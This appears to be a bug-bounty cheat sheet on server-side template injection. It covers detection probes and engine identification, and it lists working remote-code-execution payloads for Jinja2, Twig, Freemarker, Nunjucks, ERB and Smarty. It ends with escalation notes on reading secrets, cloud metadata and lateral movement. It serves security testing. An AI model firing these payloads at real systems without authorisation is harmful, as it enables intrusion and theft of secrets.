# SSTI — Server-Side Template Injection

Input rendered by a server-side template engine → often RCE. High severity when
confirmed. Read + reason only; prove with arithmetic, escalate carefully.

## Where it lives

Anywhere user input reaches a template: email/notification templates, name/
profile fields rendered back, report/PDF/invoice generators, CMS themes, "custom
message" features, error pages, subject lines, filename rendering, marketing
merge-tags. Common on Flask/Jinja2, Django, Node (Nunjucks/Handlebars/EJS/Pug),
Ruby ERB/Slim, Java (Freemarker/Velocity/Thymeleaf), Twig/Smarty (PHP), Go text/
template.

## Detection

1. **Polyglot** to trigger errors/eval: `${{<%[%'"}}%\`
2. **Arithmetic probe** — if `{{7*7}}` → `49`, `${7*7}` → `49`, `<%= 7*7 %>` →
   `49`, or `#{7*7}` renders evaluated, it's SSTI (not just XSS). `{{7*'7'}}`
   distinguishes engines (Jinja → `7777777`, Twig → `49`).
3. Distinguish from XSS: XSS reflects the literal; SSTI **evaluates** it server-side.

## Engine identification → escalation

Use the decision tree (PortSwigger): test `{{7*7}}` then `${7*7}` then `#{7*7}`,
narrow by which evaluates and by error strings.

- **Jinja2 / Flask (Python)** — RCE via:
  `{{ cycler.__init__.__globals__.os.popen('id').read() }}`,
  `{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}`,
  `{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}`.
  Sandbox-escape via `.__subclasses__()` gadget chains.
- **Twig (PHP)** — `{{ _self.env.registerUndefinedFilterCallback('exec') }}{{ _self.env.getFilter('id') }}`, `{{ ['id']|filter('system') }}`.
- **Freemarker (Java)** — `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}`.
- **Velocity (Java)** — `#set($e=...)` runtime exec gadget.
- **Nunjucks/Handlebars (Node)** — prototype/`constructor` chain:
  `{{range.constructor("return global.process.mainModule.require('child_process').execSync('id')")()}}`.
- **ERB (Ruby)** — `<%= system('id') %>` / `<%= \`id\` %>`.
- **Smarty (PHP)** — `{system('id')}` / `{php}...{/php}`.

## Safe PoC

Confirm with arithmetic (`{{7*7}}→49`) and a harmless command (`id`, `whoami`) or
reading a non-sensitive file. Do **not** run destructive commands or pivot beyond
proof — note RCE potential in the report and stop.

## Escalation

RCE → read env/secrets, cloud metadata (chain to SSRF), lateral movement. For
bounty, stop at demonstrating command execution unless the program's Safe Harbor
and rules explicitly permit deeper.

## Tools

**tplmap** / **SSTImap** (engine detection + exploitation — use for detection,
verify manually), Caido/Burp Repeater, PortSwigger SSTI labs decision tree.

## References (current)

- PortSwigger Web Security Academy — Server-side template injection.
- PayloadsAllTheThings — SSTI (engine payload catalog).
- HackTricks — SSTI.
